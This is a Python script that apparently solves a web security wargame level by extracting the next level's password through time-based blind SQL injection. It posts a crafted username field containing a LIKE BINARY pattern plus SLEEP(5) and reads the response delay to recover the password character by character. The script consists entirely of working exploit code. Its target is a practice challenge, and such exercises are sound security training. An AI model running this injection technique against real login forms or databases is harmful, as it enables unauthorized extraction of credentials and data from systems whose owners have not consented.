#!/usr/bin/env python3

import requests
import base64
import re
from levels_credentials import credentials

level_url = credentials[17]["url"]
level_username = credentials[17]["level"]
level_password = credentials[17]["password"]

next_level_url = credentials[18]["url"]
next_level_username = credentials[18]["level"]

credentials = "%s:%s" % (level_username, level_password)
auth_creds = base64.b64encode(credentials.encode("ascii"))
heads = {"Authorization": "Basic %s" % auth_creds.decode("ascii"), "Referer": next_level_url}

alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
next_pass = ""

for i in alphabet:
    payload = '%s" AND password LIKE BINARY "%s%s" and SLEEP(5) #' % (next_level_username, i, "%")
    post_data = {"username":payload}
    response = requests.post(level_url, headers=heads, data=post_data)
    data = response.text

    if response.elapsed.seconds > 2:
        next_pass += i
        print(next_pass)
        break

j = 0

while len(next_pass) < 32:
    payload = '%s" AND password LIKE BINARY "%s%s%s" and SLEEP(5) #' % (next_level_username, next_pass, alphabet[j], "%")
    print(payload)
    post_data = {"username":payload}
    response = requests.post(level_url, headers=heads, data=post_data)
    data = response.text

    if response.elapsed.seconds < 2:
        j += 1

    elif response.elapsed.seconds > 2:
        next_pass += alphabet[j]
        j = 0
        print(next_pass)
        continue

print(next_pass)
